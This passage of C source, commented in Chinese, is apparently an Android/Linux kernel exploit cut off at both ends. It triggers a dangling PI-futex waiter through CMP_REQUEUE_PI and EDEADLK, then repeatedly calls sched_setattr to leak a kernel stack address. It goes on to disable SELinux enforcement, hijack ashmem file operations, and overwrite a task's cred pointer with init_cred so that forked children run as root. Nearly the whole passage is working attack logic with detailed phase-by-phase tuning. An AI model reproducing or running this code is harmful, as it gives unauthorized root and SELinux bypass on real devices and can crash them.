  if (FRM == MAP_FAILED) { perror("mmap"); return 1; }
  read_sysname(name_hex_before, sizeof name_hex_before);
  say("[I] ops FW=%d FCMP=%d LOCKPI=%d UNLOCKPI=%d PRIVATE=%d\n", FW, FCMP, FLOCKPI, FUNLOCKPI, FP);
  say("[*] slide=%lx target=%lx fake_lock=%lx\n", (unsigned long)SLIDE,
      (unsigned long)FAKE_TGT,
      (unsigned long)FAKE_LOCK);
  say("[+] 之前 sysname hex(前40字节) = %s\n", name_hex_before);
  if (PEEK) {
    /* 运行时真相: 镜像里 init_uts_ns 的字节和真机不一样(厂商在 boot 里改过 name 字段),
     * 所以"哪一段是全 0 的洞"只能从真机 dump 里量(9/27 就是拿镜像洞当 lock 把机器打崩的)。
     * 逐 8 字节打出来, 标出零格 ⇒ 用来挑后面每次调用的 lock/T 槽位。 */
    int L = (int)(strlen(name_hex_before) / 2);
    say("[PEEK] 全长 %d 字节(没打 punch)\n", L);
    for (int i = 0; i + 8 <= L; i += 8)
      say("   uts+0x%03x = %016lx%s\n", 4 + i, (unsigned long)hexq(name_hex_before, i),
          hexq(name_hex_before, i) ? "" : "   <= 零");
    say("[DONE] peek 结束\n");
    return 0;
  }
  if (!SLIDE && HAMMER) { say("× slide=0 却要打 punch ⇒ 拒绝(假 lock 会落在未映射地址)\n"); return 2; }
  if (SENOFF) {
    /* main 自己也要一个唯一的 comm: 表里那条记录的 ptr 就是 main 的 task_struct。
     * 为什么靶子选 main 而不是 W(twin 差分给出的结论): 换掉**正在被这条链走改动的 task**
     * 的 cred 是 5/6 次当场重启的原因, 而 main 只是 punch 的发起者, 链走不碰它的 task;
     * 何况需要 root 的本来就是 main(孩子由它生、id 由它的孩子 exec)。 */
    snprintf(m_mark, sizeof m_mark, "gm%x", (unsigned)getpid());
    prctl(PR_SET_NAME, (unsigned long)m_mark, 0, 0, 0);
    say("[M] main 的 comm = [%s]  USEMAIN=%d\n", m_mark, USEMAIN);
    /* 读上一轮留下的状态(没有文件 = 0 = 全新开始)。这一手存在的理由: selinux_state 那一格
     * 里的 8 字节有 5 个是布尔, **不该被反复改着玩** ⇒ 上一轮已经动过哪一步, 下一轮必须知道。 */
    char sb[32];
    senfail = (sysctl_read(SEN_STATE_FILE, sb, sizeof sb) == 0) ? (int)strtol(sb, NULL, 0) : 0;
    say("[SEN] 上轮状态文件 %s ⇒ senfail=%d (0=干净起步)\n", SEN_STATE_FILE, senfail);
    if (SENREST == 1 && !(senfail == 0 || senfail == 19 || senfail == 90 ||
                          (senfail >= 2 && senfail <= 5))) {
      say("[SEN] senresume 的前提是「上一轮已经拿到 permissive」; 但 senfail=%d 不满足 ⇒ 拒绝\n", senfail);
      return 2;
    }
  }

  pthread_t tob; pthread_create(&tob, NULL, observer_thread, NULL);
  pthread_t tw, to;
  pthread_create(&tw, NULL, waiter_thread, NULL);
  while (!st_c_locked && !stop_all) usleep(10000);
  if (!st_c_locked) { say("[-] W 没能拿到 C\n"); return 1; }
  pthread_create(&to, NULL, owner_thread, NULL);
  pthread_t tv;
  if (VICTIM) {
    pthread_create(&tv, NULL, victim_thread, NULL);
    while (!__atomic_load_n(&v_ready, __ATOMIC_ACQUIRE) && !stop_all) usleep(2000);
  }
  while (!st_pi_locked && !stop_all) usleep(10000);
  if (!st_pi_locked) { say("[-] O 没能拿到 PI\n"); return 1; }
  while (!st_w_sleeping) usleep(10000);
  usleep(150000);

  /* 制造幽灵: 把 W 从 N requeue 到 PI(owner=O, O 阻塞在 W 持有的 C 上)⇒ 环 ⇒ EDEADLK。
   * 回滚走 remove_waiter(): rt_mutex_dequeue(PI, W 的栈上 waiter) 清了树,
   * 但 `current->pi_blocked_on = NULL` 清的是**调用者(主线程)**而不是 W ⇒ W 悬空。 */
  /* CMP_REQUEUE_PI 的参数语义: arg3=nr_wake, arg4=nr_requeue(不是 timeout!), arg6=cmpval。
   * N 当前值 0 ⇒ cmpval=0 才匹配(cm54 原版就是这么传的)。 */
  int ed = 0;
  for (int i = 0; i < 12 && !ed; i++) {
    errno = 0;
    long r = fx(N, FCMP, 1, (struct timespec *)1, PI, 0);
    if (r == -1 && errno == EDEADLK) ed = 1;
    else { say("[*] requeue #%d ret=%ld errno=%d\n", i, r, errno); usleep(200000); }
  }
  if (!ed) { say("[-] 没拿到 EDEADLK: 幽灵没成形\n"); return 1; }
  say("[*] 幽灵已成形(EDEADLK); 等 W 的 futex 超时\n");

  for (int i = 0; i < 100 && !st_ghost; i++) usleep(100000);
  if (!st_ghost) { say("[-] W 没有返回\n"); return 1; }

  /* ===== hammer: 相0 泄漏 S → 相>=1 幂等指针写(假 lock 在带内, 每轮重铺都清零) ===== */
  if (HAMMER) {
    char cur[1024], p0name[1024];
    char enf0[64] = "", enf1[64] = "";
    read_enforce_txt(enf0, sizeof enf0);
    say("[SEN] enforce 文件基线原文 = [%s]\n", enf0);
    say("[SEN] 打之前的 MAC 关卡(应当一格都打不开): 开了 %d 格\n", mac_probe("before"));
    struct sched_attr_t a;
    memset(&a, 0, sizeof a);
    a.size = sizeof a;
    a.sched_policy = 0;
    long tries = 0;
    int hit = 0, phase = 0, rounds = 0, wrote = 0;
    unsigned char cb[192], nb[192];
    char cbh[3 * sizeof cb], nbh[3 * sizeof nb];
    ssize_t cl = read_cmdline(cb, sizeof cb);
    hexbuf(cbh, sizeof cbh, cb, cl);
    say("[C] 基线 cmdline len=%zd = %s\n", cl, cl > 0 ? cbh : "(读不到)");
    filegate_probe("before");                   /* 打之前的三条必拒基线(正对照用) */
    say("[H] 开始 hammer: fake_lock=%lx prio=%d SHAPE=%d 载荷字=%d NPH=%d\n",
        (unsigned long)FAKE_LOCK, WP_PRIO, SHAPE, WAITER_WORD + 8, NPH);
    if (KIDS) kids_init();
    while (tries < H_MAX) {
      /* ★ 每次都必须真的改掉 nice: policy/nice 全不变时 __sched_setscheduler 走
       *   "If not changing anything" 的 unlock 短路, 压根不调 rt_mutex_adjust_pi。
       * ★ 所有昂贵的东西(日志=fsync ~200us)必须在置 ready **之前**做完: 载荷一铺好,
       *   到 sched_setattr 之间只允许纯自旋, 否则节拍会把覆盖层洗掉(见回合协议注释)。 */
      /* ★ 打之前必须确认这一相**真的有载荷可铺**: spray_build 里任何"缺前提就 return"的相
       *   都不能 punch —— 那时带里是上一相的残渣/IRQ 垃圾, 内核会拿它当指针解引用
       *   (9/27 那次"相3 需要 TASK 却还是打了"就是在这里把机器打崩的)。 */
      /* 相 13 = 收口: **不再 punch**(带里是脏的也无所谓, 反正不打), 只让 W 自己去 fork ——
       * 孩子必须由 W 亲生才会继承刚被改成 init_cred 的 cred(main 的孩子继承的是 main 的旧 cred)。 */
      if (phase == 13) {
        __atomic_store_n(&h_keep, 0, __ATOMIC_RELEASE);
        __atomic_store_n(&h_ready, 1, __ATOMIC_RELEASE);
        while (!__atomic_load_n(&h_armed, __ATOMIC_ACQUIRE)) {
          if (stop_all) break;
          __asm__ volatile("yield" ::: "memory");
        }
        if (stop_all) break;
        __atomic_store_n(&h_dokid, 1, __ATOMIC_RELEASE);
        __atomic_store_n(&h_fired, 1, __ATOMIC_RELEASE);
        usleep(500000);
        say("[X] W 已亲自 clone 孩子(继承改过的 cred) ⇒ 收尾放它们 exec 报 id\n");
        break;
      }
      if (phase == 7) {
        /* 收口相: 不 punch(带脏不脏都无所谓), 只让 W 亲自 clone 孩子 —— 孩子继承的是 W 刚被
         * 改过的 cred ⇒ 由它们 exec `id` 报出来的 uid=0(root) 才是"内核自己给的 root"的凭证。 */
        __atomic_store_n(&h_keep, 0, __ATOMIC_RELEASE);
        __atomic_store_n(&h_ready, 1, __ATOMIC_RELEASE);
        while (!__atomic_load_n(&h_armed, __ATOMIC_ACQUIRE)) {
          if (stop_all) break;
          __asm__ volatile("yield" ::: "memory");
        }
        if (stop_all) break;
        if (VICTIM) {
          __atomic_store_n(&v_dokid, 1, __ATOMIC_RELEASE);
          if (SHELLMODE) {
            int sp = 0;
            for (int k = 0; k < 100 && !(sp = __atomic_load_n(&v_shellpid, __ATOMIC_ACQUIRE)); k++)
              usleep(50000);
            say("[X] sen 相7(VICTIM+shell): 会话 shell 的孩子 pid=%d ⇒ 等它(非 tty 时它跑完举证就自己退出)\n", sp);
            if (sp > 0) {
              int waited = 0, cap = ISHELLMODE ? 1800 : 60;
              while (waited < cap) {
                int st = 0;
                long w = waitpid(sp, &st, WNOHANG);
                if (w == sp || w < 0) break;
                usleep(1000000); waited++;
              }
              say("[X] 会话 shell 已结束(等了 %ds / 上限 %ds) ⇒ 收尾\n", waited, cap);
            }
          } else {
            usleep(600000);
          }
          say("[X] sen 相7(VICTIM): 不 punch, 由靶子线程自己 clone 孩子去继承它的 cred\n");
        } else if (USEMAIN) {
          /* 靶子是 main => 举证的孩子必须由 **main** 亲生(它们继承 main 刚被换掉的 cred) */
          kid_new(); kid_new(); kid_new();
          say("[X] sen 相7(USEMAIN): 不 punch, 由 main 自己 clone 3 个孩子去继承刚改过的 cred\n");
        } else {
          __atomic_store_n(&h_dokid, 1, __ATOMIC_RELEASE);
          __atomic_store_n(&h_fired, 1, __ATOMIC_RELEASE);
          usleep(500000);
          say("[X] sen 相7: **不再 punch**, 只让 W 自己 clone 孩子(它们继承刚改过的 cred)\n");
        }
        break;
      }
      if (SENOFF ? (phase > 7 || ((phase == 3 || phase == 4 || phase == 5 || phase == 6) && (!TASK || !ICRED || (USEMAIN && !MTASK))))
                 : (phase > 13 || ((phase == 11 || phase == 12) && !TASK) || (phase == 10 && !h_cand))) {
        say("[!] 相%d 没有可铺的载荷(TASK=%016lx) ⇒ 收工, 不打脏带\n",
            phase, (unsigned long)TASK);
        break;
      }
      a.sched_nice = (tries & 1) ? 19 : 18;
      tries++;
      /* 旧的"读相每发现 clone 抢[最新 task]"节拍随 rb_next 读通道一起判废 ⇒ kidrace 恒 0;
       * 孩子现在只在**提权写之后**造(那时 fork 才会继承 init_cred ⇒ id 报 uid=0)。 */
      int kidrace = 0;
      if (tries <= 400 || (tries & 255) == 0)
        say("[h] #%ld 相%d%s 即将 punch nice=%d (这行之后没有日志=死在这一发的链走里)\n",
            tries, phase, kidrace ? "/kid" : "", a.sched_nice);
      __atomic_store_n(&h_keep, kidrace ? 1 : 0, __ATOMIC_RELEASE);
      __atomic_store_n(&h_ready, 1, __ATOMIC_RELEASE);   /* 杂活已干完, 可以铺了 */
      while (!__atomic_load_n(&h_armed, __ATOMIC_ACQUIRE)) {
        if (stop_all) break;
        __asm__ volatile("yield" ::: "memory");
      }
      if (stop_all) break;
      __atomic_store_n(&h_armed, 0, __ATOMIC_RELEASE);
      /* ★ 载荷已铺好: 这之前所有慢活(日志/fsync)都必须做完。 */
      if (kidrace) kid_new();
      int wseq0 = __atomic_load_n(&w_seq, __ATOMIC_ACQUIRE);
      int vseq0 = __atomic_load_n(&v_seq, __ATOMIC_ACQUIRE);  /* 这一发之前 W 报告到哪了 */
      errno = 0;
      syscall(SYS_sched_setattr, (pid_t)p_tid, &a, 0);
      __atomic_store_n(&h_fired, 1, __ATOMIC_RELEASE);
      /* main 自己的 syscall 只压 main 的内核栈, 不动 W 的载荷带 */
      if (phase == 0) {
        int enf = read_enforce();
        if (TGT_ABS >= 0) {                       /* T 不在 uts 里 ⇒ 用 probe 文件当判据 */
          ssize_t tl = read_cmdline(nb, sizeof nb);
          if (tl > 0 && ((size_t)tl != (size_t)cl || memcmp(nb, cb, (size_t)tl))) {
            hit = 1;
            hexbuf(nbh, sizeof nbh, nb, tl);
            say("[HIT] 泄漏相落地(probe 文件变了!) len=%zd = %s\n", tl, nbh);
            uintptr_t Sx = hexq(nbh, 0);
            say("[HIT] probe 头 8 字节 = %016lx  ⇒ .bss 指针可写 + S 已泄漏\n", (unsigned long)Sx);
            h_S = Sx; h_want = 1; phase = 1; rounds = 0;
            if (NPH <= 0) break;
            continue;
          }
        }
        if (enf == '0' && !SENOFF) {
          /* sen 模式不看这个判据: 设备可能**本来就是**上一轮同一 boot 里写成的 permissive,
           * 那样一进来就 break 会连 S 都漏不到(泄漏相必须跑完)。 */
          hit = 1;
          say("[HIT] 第 %ld 发之后 /sys/fs/selinux/enforce 变成 0 ⇒ Permissive!\n", tries);
          break;
        }
        read_sysname(cur, sizeof cur);
        if (strcmp(cur, name_hex_before)) {
          hit = 1;
          say("[HIT] 第 %ld 发之后 sysname 变了(enforce=%c):\n%s\n", tries,
              enf > 0 ? enf : '?', cur);
          uintptr_t S = leaked_stack(cur);
          if (S) say("[HIT] 泄漏到 S=%016lx ⇒ 带=[%016lx,%016lx) 假lock#2=[%016lx,%016lx)\n",
                     (unsigned long)S, (unsigned long)(S - 0x48), (unsigned long)(S - 0x48 + 0x200),
                     (unsigned long)(S - 0x48), (unsigned long)S);
          if (HIJACK && S && NPH > 0) {
            strcpy(p0name, cur);
            h_S = S; h_phase = 1; __atomic_store_n(&h_want, 1, __ATOMIC_RELEASE);
            phase = 1; rounds = 0;
            say("[*] S 已知 ⇒ 进相 1(带内假 lock + 幂等指针写)\n");
            continue;
          }
          break;
        }
        if ((tries % 2000) == 0) say("[H] %ld 次未中(还没炸就说明每次读到的都是残渣里的早退)\n", tries);
        continue;
      }
      /* ===== 相 >=1 的判据(编号见 spray_build 的相表) =====
       * 相1    = **控制相**: avenrun(.bss) ← 核指针 ⇒ 观察通道 /proc/loadavg 第一列
       *          (落地 ⇒ 变成几十亿; 正常负载 < 100) ⇒ 一次分清"我这发 .bss 写到底生不生效"
       * 相2..9 = 读通道逐窗: **读回来前 8 字节 == 我们写入的 pc 就是"这一发确实落了"的判据**
       * 相10   = 候选验真(看 cand+0x68 是否 == W 的栈基址)
       * 相11/12 = cred 写(需要 TASK 已验真) ; 相13 = 由 W 亲自 fork 举证 */
      rounds++;
      if (SENOFF) {
        int u[4], g[4];
        if (self_ids(u, g)) { senfail = phase; say("[!] 读不到 /proc/self/status ⇒ 收工(每发都必须有判据)\n"); break; }
        if (phase == 1) {
          /* 判据两层: (a) enforce 文件整段原文变了 = 那一字节确实被写动;
           *          (b) mac_probe() 有关卡放开 = MAC 真的不再拦。
           * 只要 (a) 成立就继续往下(相2 的 fops 劫持不需要 MAC), 但会把 (b) 的结果记清楚。 */
          static int saw_change;
          int changed = 0;
          read_enforce_txt(enf1, sizeof enf1);
          if (strcmp(enf1, enf0)) changed = 1;
          if (changed && !saw_change) {
            saw_change = 1;
            hit = 1; wrote = 1;
            say("[SEN] ★ 相1 第 %d 发: enforce 原文 [%s] → [%s] ⇒ **那一字节被写动了**\n",
                rounds, enf0, enf1);
          }
          if (senfail && SENREST != 1 && !changed && enf0[0] != '0') {
            /* 只有"这一发连那一字节都没能改动"时才尊重上轮状态; 已经改动就照常往下走
             * (9/28 有一次就是被这里拦住, 白白浪费一轮 —— 当时 changed 已经为真)。
             * ★ 基线本来就是 0(上一轮在同一 boot 里已经写成 permissive)时不适用: 那时
             *   "没变化"是**预期**, 不能当成"这笔没落地"。 */
            say("[SEN] 上轮 sen 停在 %d ⇒ SENREST=%d ⇒ 本轮只重打这一笔, 不碰后面\n", senfail, SENREST);
            senfail = 1;
            break;
          }
          int gates = mac_probe(rounds <= 2 || (rounds % 8) == 0 ? "after" : "quiet");
          if (changed && gates == 0 && rounds >= 4) {
            say("[SEN] 注: 字节变了但 0666 关卡仍全被拦 ⇒ **MAC 其实还开着**(可能本机 avc 读的是\n"
                "      另一个布尔, 或厂商有守护把它改回)。先连读 8 次看它会不会自己变回去:\n");
            for (int i = 0; i < 8; i++) {
              char wb[64];
              read_enforce_txt(wb, sizeof wb);
              say("[SEN]   watch#%-2d +%-3dms [%s]\n", i, i * 25, wb);
              usleep(25000);
            }
          }
          if (gates > 0) {
            say("[SEN] ★★★ %d 道「只有 SELinux 会拦」的关卡放开 ⇒ **MAC 真的失效了** ★★★\n", gates);
            if (!PH2 && w_mark[0]) {
              /* ★ 本轮主线: MAC 一失效就用"给 comm 拿 task"这条白送通道认出 **W 自己的
               *   task_struct**, 拿到之后相3/相4 只是把 cred 指针顶成 init_cred(两发指针写)。 */
              TASK = find_self_task(w_mark, VICTIM ? v_mark : m_mark);
              if (TASK) {
                hit = 1; wrote = 1; senfail = 0;
                say("[SEN] ★★★ TASK=%016lx ⇒ 相3 写 *(task+0x848)=init_cred (判据: W 自己 getuid)%s\n",
                    (unsigned long)TASK, TWIN ? " ⇒ 但本轮先打**孪生弹**(相2)做差分" : "");
                phase = TWIN ? 2 : 3; rounds = 0;
                __atomic_store_n(&h_phase, phase, __ATOMIC_RELEASE);
                continue;
              }
              senfail = 22;
              say("[SEN] × 认不出自己的 task_struct ⇒ 一发不盲打 ⇒ 收工\n");
              break;
            }
            sla_dump();                /* 零风险泄露: /proc/sla 的 409KB 堆缓冲 */
            sla_mmap_test();             /* 进一步: mmap 越界读物理相邻的线性映射 */
            int rc = tracefs_leak();
            say("[SEN] tracefs_leak() = %d (0=拿到 t/cred; 负数=失败; **kprobe_events 是 0644 ⇒ 预期 -1**)\n", rc);
            if (rc == 0 && LEAK_CRED) {
              CRED = LEAK_CRED;
              senfail = 0;
              say("[SEN] 采纳 cred=%016lx ⇒ 直接进相 3 清 id 字段\n", (unsigned long)CRED);
              phase = 3; rounds = 0;
              __atomic_store_n(&h_phase, 3, __ATOMIC_RELEASE);
              continue;
            }
          }
          if (!changed && rounds >= 30) {
            senfail = 1;
            say("[SEN] × 相1 连打 %d 发: enforce 原文一点没变 ⇒ 这一笔**根本没落地**(设备活着 ⇒ 无害)\n",
                rounds);
            break;
          }
          /* 字节变了但关卡没开(可能 MAC 其实还开着) ⇒ 仍然试一次认 task: 读不到 /proc/sla
           * 就自然失败, 不会有任何盲打。 */
          if (changed && rounds >= 2 && !PH2 && w_mark[0]) {
            TASK = find_self_task(w_mark, VICTIM ? v_mark : m_mark);
            if (TASK) {
              hit = 1; wrote = 1;
              say("[SEN] ★★★ TASK=%016lx ⇒ 相3 写 *(task+0x848)=init_cred\n", (unsigned long)TASK);
              senfail = 0; phase = 3; rounds = 0;
              __atomic_store_n(&h_phase, 3, __ATOMIC_RELEASE);
              continue;
            }
            senfail = 22;
            say("[SEN] × 这一发之后还是认不出自己的 task_struct ⇒ 一发不盲打 ⇒ 收工\n");
            break;
          }
          if (changed && rounds >= 2) {
            senfail = 0;
            phase = 2; rounds = 0;
            __atomic_store_n(&h_phase, 2, __ATOMIC_RELEASE);
            say("[R] === 相1 达成(enforce 原文已变) ⇒ 进相2: 形状(4) 劫持 ashmem_misc.fops ===\n");
            continue;
          }
          continue;
        }
        if (phase == 2 && TWIN) {
          /* 孪生弹的判据 = **能走到这一行就说明设备活着**, 再加一条"W 的 uid 仍是基线 2000"
           * (我们没动 task->cred ⇒ 变了就说明落点算错)。
           *   活着 ⇒ 形状(2) 的"值必须可写"那一半没问题, 相3 的重启率来自**换掉 cred 指针**这笔
           *          的语义后果 ⇒ 下一步该改的是"换 cred 之后别让内核继续用被弄脏的 init_cred",
           *          即把补刀相挪到**同一发里**(做不到)或换一份**不属于内核线程共享**的 root cred。
           *   死 ⇒ 配对写盖住 init_cred 头 8 字(=全内核线程的 uid 变垃圾)本身就是杀手。 */
          int wu, we;
          if (VICTIM) {
            for (int k = 0; k < 4000 && __atomic_load_n(&v_seq, __ATOMIC_ACQUIRE) == vseq0; k++)
              usleep(100);
            wu = __atomic_load_n(&v_uid, __ATOMIC_ACQUIRE);
            we = __atomic_load_n(&v_euid, __ATOMIC_ACQUIRE);
          } else if (USEMAIN) {          /* 被换 cred 的是 main 自己 ⇒ 直接读自己的 uid */
            wu = (int)getuid(); we = (int)geteuid();
          } else {
            for (int k = 0; k < 4000 && __atomic_load_n(&w_seq, __ATOMIC_ACQUIRE) == wseq0; k++)
              usleep(100);
            wu = __atomic_load_n(&w_uid, __ATOMIC_ACQUIRE);
            we = __atomic_load_n(&w_euid, __ATOMIC_ACQUIRE);
          }
          say("[TWIN] 孪生弹之后设备活着: W 自报 uid=%d euid=%d (seq %d→%d) ⇒ %s\n", wu, we,
              wseq0, __atomic_load_n(&w_seq, __ATOMIC_ACQUIRE),
              wu == 2000 ? "配对写盖住 init_cred **本身不炸** ⇒ 相3 的杀手 = '换掉 task->cred'那一笔"
                         : "uid 不是基线 ⇒ 载荷落点与模型不符(先别打真弹)");
          if (wu != 2000) { senfail = 41; break; }
          senfail = 0; wrote = 1;
          say("[TWIN] ⇒ 进相3 打真弹(同形状同值, 只把目的换回 task+0x848)\n");
          phase = 3; rounds = 0;
          __atomic_store_n(&h_phase, 3, __ATOMIC_RELEASE);
          continue;
        }
        if (phase == 2) {
          /* 判据 = 开 /dev/ashmem 读: 真 ashmem_fops 没有 .read ⇒ -EINVAL(22) = 没落;
           * 读得到字节 **并且** 窗口第 0x10 格 == 我们铺的伪 fops 带内地址 ⇒ 三重自校验。 */
          int afd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
          int e = errno;
          if (afd < 0) {
            say("[SEN] 相2 第 %d 发: open(/dev/ashmem) errno=%d(%s)\n", rounds, e, strerror(e));
            if (e == 13 && rounds >= 3) {
              senfail = 21;
              say("[SEN] × 被 EACCES 挡 ⇒ 还需要 MAC 放开; 本轮 MAC 关卡没通过 ⇒ 收工\n");
              break;
            }
          } else {
            static int saw_hijack;
            ssize_t one = 0;
            unsigned char probe[16];
            one = read(afd, probe, sizeof probe);
            int re = errno;
            say("[SEN] 相2 第 %d 发: open ok, read = %zd errno=%d(%s)%s\n", rounds, one, re,
                strerror(re), one == -1 ? "  ← -EINVAL=真 ashmem 无 .read ⇒ 还没落" : "  ★ 读到字节 ⇒ 劫持生效");
            if (one > 0) {
              hit = 1; wrote = 1;
              if (!saw_hijack) {
                saw_hijack = 1;
                ashmem_leak_dump(afd);                 /* 窗口底址 = &ashmem_misc(唯一 DAC 放行的节点) */
                if (MARKD) marker_experiment();        /* 同窗差分: 空白对照 + fork + open + write */
              }
              close(afd);
              senfail = 22;                     /* 走到过相2 ⇒ 状态记"泄露已到手" */
              if (!CRED) {
                say("[SEN] 相2 的 .data 泄露完成; **cred 还得从这份泄露里认出来** ⇒ 本轮到此收工\n");
                break;
              }
              phase = 3; rounds = 0;
              __atomic_store_n(&h_phase, 3, __ATOMIC_RELEASE);
              continue;
            }
            close(afd);
          }
          if (rounds >= 20) { senfail = 2; say("[SEN] × 相2 连打 %d 发没劫持成功 ⇒ 收工\n", rounds); break; }
          continue;
        }
        /* 相3..6: 纯零写 cred 的 id 字段(8 对齐一发 8 字节); 判据 = /proc/self/status 对应栏归 0 */
        /* 相3 = *(task+0x848) ← init_cred: 判据是 **W 自己**报告的 getuid()(主观 cred 归零才看得到);
         * 相4 = *(task+0x840) ← init_cred: 判据是 main 读 `/proc/<W_tid>/status`(那一栏取 real_cred)。
         * 两发各自独立判定 ⇒ 任何一发没落就停在原地, 绝不带着脏状态往下走。 */
        int ok = 0;
        if (DIAG && phase == 5) {
          /* 相5(DIAG) = 非对齐纯零写的单独正对照: 相4 之后 *(Z1)=Z2-8, 这一发把 Z1+4..Z1+11 清零
           * ⇒ 期望 `*(Z1) == (Z2-8) & 0xFFFFFFFF`(低 4 字节原样、高 4 字节归 0)。 */
          uint64_t a = sla_peek(DIAG_Z1);
          uint64_t e1 = (uint64_t)(DIAG_Z2 - 8) & 0xffffffffULL;
          ok = (a == e1);
          say("[DIAG] 相5 非对齐零写(落点 %016lx) ⇒ 读回 *(Z1)=%016llx 期望=%016llx ⇒ %s\n",
              (unsigned long)(DIAG_Z1 + 4), (unsigned long long)a, (unsigned long long)e1,
              ok ? "★★★ **非对齐形状(1) 纯零写坐实** ⇒ cred 补刀相(打 IC+4 保 usage)的前提成立"
                 : "没读到期望值 ⇒ 非对齐这一发没落 ⇒ 提权补刀必须改打 8 对齐的 IC+0");
          if (ok) { senfail = 0; wrote = 1; break; }
          if (rounds >= 6) { senfail = 35; say("[DIAG] × 相5 连打 %d 发没落 ⇒ 停\n", rounds); break; }
          continue;
        }
        if (DIAG && (phase == 3 || phase == 4)) {
          /* 自检相: 两笔写都应当"当场读得回来"。
           *   相3(dst=Z1,val=Z2) ⇒ *(Z1)=Z2 且 *(Z2)=Z1-8
           *   相4(dst=Z2,val=Z1) ⇒ *(Z2)=Z1 且 *(Z1)=Z2-8   ⇒ 两页最终都回到接近 0(只差 8 字节)
           * ⇒ 这两发成了, 就一手证明"形状(2) 能把任意核地址当目的去落两笔可见的写";
           *   那时再换成 cred 槽(窗口读不回来的动态地址)就不是盲赌, 而是同一形状换个目的。 */
          uint64_t a = sla_peek(DIAG_Z1), c = sla_peek(DIAG_Z2);
          int p3 = (phase == 3);
          uint64_t e1 = p3 ? (uint64_t)DIAG_Z2 : (uint64_t)(DIAG_Z2 - 8);
          uint64_t e2 = p3 ? (uint64_t)(DIAG_Z1 - 8) : (uint64_t)DIAG_Z1;
          ok = (a == e1 && c == e2);
          say("[DIAG] 相%d 读回 *(Z1=%016lx)=%016llx 期望=%016llx | *(Z2=%016lx)=%016llx 期望=%016llx ⇒ %s\n",
              phase, (unsigned long)DIAG_Z1, (unsigned long long)a, (unsigned long long)e1,
              (unsigned long)DIAG_Z2, (unsigned long long)c, (unsigned long long)e2,
              ok ? "这一发的两笔写都可见" : "没读到期望值 ⇒ 这一发没落(重打)");
          if (ok) {
            wrote = 1;
            if (phase == 4) {
              senfail = 0;
              say("[DIAG] ★★★ 两发四笔写全部落地 ⇒ 任意核地址上的指针写通道坐实"
                  " ⇒ 再补一发**非对齐**纯零写(相5, 提权补刀的前提)\n");
              phase = 5; rounds = 0;
              __atomic_store_n(&h_phase, 5, __ATOMIC_RELEASE);
              continue;
            }
            phase++; rounds = 0;
            __atomic_store_n(&h_phase, phase, __ATOMIC_RELEASE);
            continue;
          }
          if (rounds >= 6) {
            senfail = 30 + phase;
            say("[DIAG] × 相%d 连打 %d 发都没落 ⇒ 停在这里(动态写通道没通, 谈提权为时过早)\n", phase, rounds);
            break;
          }
          continue;
        }
        if (phase == 3) {
          /* ★ 相3 的判据是**开打之前就算出来的定量预言**, 不是"看看有没有变":
           *   形状(2) 的几何 = `*(parent+8)=right` + `*(right)=pc`, 其中
           *     parent+8 = dst = TASK+0x848 ⇒ right = 我们写进去的值 = ICRED, pc = parent = TASK+0x840
           *   ⇒ 第二笔把 `TASK+0x840` 这个核指针整个写进 `*(ICRED)` = `usage`(低4字节)+`uid`(高4字节)
           *   ⇒ W 的 getuid() **应当正好等于 (TASK+0x840)>>32**。sen19 实测 uid=-118=0xFFFFFF8A,
           *     而那一轮 TASK=0xffffff8a2ebbe900 ⇒ 高 32 位正是 0xFFFFFF8A ⇒ 预言一字不差。
           *   命中 = 槽对 + 值对 + 配对写按几何落地, 三件事一次证完。 */
          int wu, we;
          if (VICTIM) {
            for (int k = 0; k < 4000 && __atomic_load_n(&v_seq, __ATOMIC_ACQUIRE) == vseq0; k++)
              usleep(100);
            wu = __atomic_load_n(&v_uid, __ATOMIC_ACQUIRE);
            we = __atomic_load_n(&v_euid, __ATOMIC_ACQUIRE);
          } else if (USEMAIN) {          /* 被换 cred 的是 main 自己 ⇒ 直接读自己的 uid */
            wu = (int)getuid(); we = (int)geteuid();
          } else {
            for (int k = 0; k < 4000 && __atomic_load_n(&w_seq, __ATOMIC_ACQUIRE) == wseq0; k++)
              usleep(100);
            wu = __atomic_load_n(&w_uid, __ATOMIC_ACQUIRE);
            we = __atomic_load_n(&w_euid, __ATOMIC_ACQUIRE);
          }
          int pred = (int)(uint32_t)(((USEMAIN ? MTASK : TASK) + TASK_RCRD_OFF) >> 32);
          ok = (wu == pred);
          say("[SEN] 相3(写 task+0x848 = %016lx): W 自报 uid=%d euid=%d (seq %d→%d) 预言 uid=%d"
              "((task+0x840) 的高 32 位) ⇒ %s\n", (unsigned long)ICRED, wu, we,
              wseq0, __atomic_load_n(&w_seq, __ATOMIC_ACQUIRE), pred,
              ok ? "★★★ 定量命中 ⇒ 槽/值/配对写三者全按几何落地(还差补刀相把 uid 清 0)"
                 : (wu == 2000 || wu == -1 ? "没动静 ⇒ 这一发没落(再打)"
                                           : "变了但不是预言值 ⇒ 判据要重算, 停"));
          if (!ok && wu != 2000 && wu != -1) {
            senfail = 40;
            say("[SEN] × 相3: uid 离开基线却不是预言值(%d vs %d) ⇒ 不再重打(重打只会得到同一个值)\n", wu, pred);
            break;
          }
        } else if (phase == 4) {
          /* 相4 = **补刀**(紧跟相3): 纯零写 `*(IC+4)` 起 8 字节 = uid+gid ⇒ 把配对写弄脏的
           * 那一栏还原成 init_cred 的真值 0, **usage 全程没动**。
           * 判据 = W 自报 uid=0 且 euid=0 ⇒ **主观 root**(getuid/geteuid/getgid/capable
           * 全部只看 cred ⇒ 到这一步已经可以举证的 uid=0(root) 就到手了)。 */
          int wu, we;
          if (VICTIM) {
            for (int k = 0; k < 4000 && __atomic_load_n(&v_seq, __ATOMIC_ACQUIRE) == vseq0; k++)
              usleep(100);
            wu = __atomic_load_n(&v_uid, __ATOMIC_ACQUIRE);
            we = __atomic_load_n(&v_euid, __ATOMIC_ACQUIRE);
          } else if (USEMAIN) {          /* 被换 cred 的是 main 自己 ⇒ 直接读自己的 uid */
            wu = (int)getuid(); we = (int)geteuid();
          } else {
            for (int k = 0; k < 4000 && __atomic_load_n(&w_seq, __ATOMIC_ACQUIRE) == wseq0; k++)
              usleep(100);
            wu = __atomic_load_n(&w_uid, __ATOMIC_ACQUIRE);
            we = __atomic_load_n(&w_euid, __ATOMIC_ACQUIRE);
          }
          ok = (wu == 0 && we == 0);
          say("[SEN] 相4(纯零写 *(%016lx+4)=0 还原 uid+gid): W 自报 uid=%d euid=%d (seq %d→%d) ⇒ %s\n",
              (unsigned long)ICRED, wu, we, wseq0,
              __atomic_load_n(&w_seq, __ATOMIC_ACQUIRE),
